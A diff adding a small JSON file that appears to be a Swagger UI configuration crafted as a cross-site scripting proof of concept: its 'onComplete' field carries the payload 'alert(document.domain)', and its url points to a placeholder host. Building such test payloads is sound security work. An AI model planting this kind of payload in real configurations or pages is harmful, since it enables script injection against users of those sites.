@@ -1,0 +1,5 @@
+{
+  "url": "https://tuo-url.com/test.json",
+  "dom_id": "#swagger-ui",
+  "onComplete": "alert(document.domain)"
+}
